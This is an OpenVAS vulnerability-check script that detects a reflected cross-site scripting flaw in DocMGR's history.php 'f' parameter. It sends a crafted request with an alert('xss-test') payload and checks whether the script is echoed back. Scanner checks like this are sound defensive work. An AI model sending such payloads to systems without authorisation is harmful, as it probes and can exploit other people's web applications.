##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_docmgr_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# DocMGR Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary html
  and scripting code in user's browser in context of a vulnerable website.
  Impact Level: Application.";
tag_affected = "DocMGR version 1.1.2 and prior.";

tag_insight = "The flaw is caused by an input validation error while processing the 'f'
  parameter in 'history.php', allows attackers to send specially crafted
  HTTP request to the vulnerable application.";
tag_solution = "No solution or patch is available as of 29th June, 2011. Information
  regarding this issue will be updated once the solution details are available
  For updates refer to http://www.docmgr.org/";
tag_summary = "This host is running DocMGR is prone to cross-site scripting
  vulnerability.";

if(description)
{
  script_id(902391);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("DocMGR Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44584/");
  script_xref(name : "URL" , value : "http://www.naked-security.com/nsa/198631.htm");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101457/docMGR1.1.2-XSS.txt");

  script_description(desc);
  script_summary("Check if DocMGR is vulnerable to Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get the default port
docPort = get_http_port(default:80);
if(!docPort){
  docPort = 80;
}

## check the port state
if(!get_port_state(docPort)){
  exit(0);
}

foreach dir (make_list("/docmgr", "/DocMGR", cgi_dirs()))
{
  ## Send and recieve the data
  sndReq = http_get(item:string(dir, "/index.php"), port:docPort);
  rcvRes = http_keepalive_send_recv(port:docPort, data:sndReq);

  ## Confirm the application
  if(">Welcome to DocMGR" >< rcvRes)
  {
    ## construct the exploit
    sndReq = http_get(item:string(dir, '/history.php?f=0");}alert("xss-test")'+
                                                        ';{//'), port:docPort);
    rcvRes = http_send_recv(port:docPort, data:sndReq);

    ## Check the response to confirm vulnerability
    if('}alert("xss-test");' >< rcvRes)
    {
      security_warning(docPort);
      exit(0);
    }
  }
}
